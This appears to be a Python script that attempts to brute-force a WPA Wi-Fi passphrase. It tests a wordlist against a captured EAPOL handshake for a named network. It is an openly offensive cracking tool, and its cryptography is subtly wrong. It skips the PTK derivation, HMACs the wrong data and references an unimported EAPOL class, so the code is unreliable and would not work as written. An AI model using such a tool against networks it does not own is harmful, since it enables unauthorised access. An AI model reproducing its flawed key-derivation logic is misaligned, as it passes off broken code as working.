import hashlib
import hmac
import struct
from scapy.all import rdpcap

def pbkdf2_sha1(password, ssid, iterations=4096, key_length=32):
    """
    Implement PBKDF2-HMAC-SHA1 to derive the PMK from the password and SSID.
    """
    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), iterations, key_length)

def check_mic(pmk, handshake_file):
    """
    Compare the derived PMK with the MIC from the handshake.
    """
    packets = rdpcap(handshake_file)
    eapol_msg_1 = packets[0]
    eapol_msg_2 = packets[1]

    # Extract necessary fields from the EAPOL messages (this will depend on your specific packet structure)
    mic_from_handshake = eapol_msg_2[EAPOL].MIC

    # Create the data to verify the MIC
    mic_to_verify = hmac.new(pmk, eapol_msg_2.payload, hashlib.sha1).digest()

    return mic_from_handshake == mic_to_verify

def brute_force_handshake(handshake_file, ssid, wordlist):
    """
    Try each password from the wordlist and check if it matches the WPA key.
    """
    for password in wordlist:
        pmk = pbkdf2_sha1(password, ssid)
        if check_mic(pmk, handshake_file):
            print(f"Password found: {password}")
            return password
    return None

# Example usage:
handshake_file = 'Shak.cap'
ssid = 'PEKLO'
wordlist = ['password1', 'password2', '12345678', 'peklovpn34']

found_password = brute_force_handshake(handshake_file, ssid, wordlist)

if found_password:
    print(f"Password is: {found_password}")
else:
    print("Password not found.")
